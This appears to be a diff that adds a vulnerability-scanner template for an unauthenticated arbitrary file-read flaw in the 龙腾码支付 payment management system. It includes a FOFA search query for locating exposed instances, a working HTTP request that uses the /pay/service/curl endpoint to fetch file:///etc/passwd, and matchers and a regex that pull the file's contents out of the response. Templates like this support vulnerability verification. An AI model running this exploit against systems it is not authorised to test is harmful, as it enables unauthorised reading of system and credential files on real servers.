@@ -1,0 +1,27 @@
+## id: VEID-2025-0120
+## name: 龙腾码支付payservicecurl任意文件读取
+## author: hack007x
+## severity: high
+## tags: veid,file,veid2025
+## description: 龙腾码支付管理系统存在未授权的任意文件读取漏洞
+## fofa-query: body="/epaydoc/epaydoc.php"
+## verification: true
+
+
+GET /pay/service/curl?url=file:///etc/passwd HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: header["Content-Type"] contains "html"
+#@ matcher: body matches /root:[^:]*:[0-9]+:[0-9]+:/
+#> extract: name=etc_passwd, from=body, regex=/(root:[^:]*:[0-9]+:[0-9]+:[^:]*:[^:]*:\/[^\n]+)/, group=1
+
+
+
+
+
+# @VEIL-STAMP: 303047bf68f60e43a62c6aeb999a1c53725429c597d1075be0abcc88e0aea3e4
